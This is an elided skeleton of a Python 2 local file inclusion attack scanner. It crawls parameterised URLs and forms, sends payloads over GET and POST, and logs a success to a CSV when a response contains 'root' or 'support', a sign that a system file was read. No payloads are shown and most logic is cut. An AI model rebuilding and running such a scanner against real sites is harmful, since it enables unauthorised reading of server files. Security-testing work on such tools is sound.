...
def save_data(method, case, url, payloads, res_contents):
    
    intereting_strings = ["root", "support"]
    
    for intereting_string in intereting_strings:
        if res_contents.find(intereting_string) != -1:
            
#             print res_contents
            f = open("lfi_result.csv", "a+")
        ...
        try:
            ...
            if cookie is None:
                ...
                try:
                    ...
                    save_data(method, case, res.url, payloads, res_contents)
                    ...
                    print '\nlfi attack\'s stage 2 is suddenly done: ', end_time - start_time
                    print "*" * 120
...
def predict_lfi_attack_time(attack_commands_A, attack_commands_B):
...
def lfi_attack(payloads, method, action, case, attack_commands_A, attack_commands_B):
...
def main():
    ...
    predict_lfi_attack_time(attack_commands_A, attack_commands_B)
...
#step1
    ...
    for row in cur:
        ...
        if urlparse(url)[4]:
            ...
            if url_with_params not in links_to_visit_params:
                ...
                lfi_attack(payloads, "GET", url, "case1", attack_commands_A, attack_commands_B)
    ...
    print '\nlfi attack\'s stage 1 is done: ', end_time - start_time
    print "*" * 120
...
#         if there is no form, it return False 
            ...
            for result in results:
                ...
                if method == "GET":
                    ...
                    if url_with_params not in links_to_visit_params:
                        ...
                        lfi_attack(payloads, "GET", action, "case2", attack_commands_A, attack_commands_B)
                    ...
                    if url_with_params not in links_to_visit_params:
                        ...
                        lfi_attack(payloads, "POST", action, "case2", attack_commands_A, attack_commands_B)
    ...
    print "*" * 120
    print "you send requests %s times" % (req_cnt - f_req_cnt)
    print '\nlfi attack\'s stage 2 is done: ', end_time - start_time
    print "*" * 120
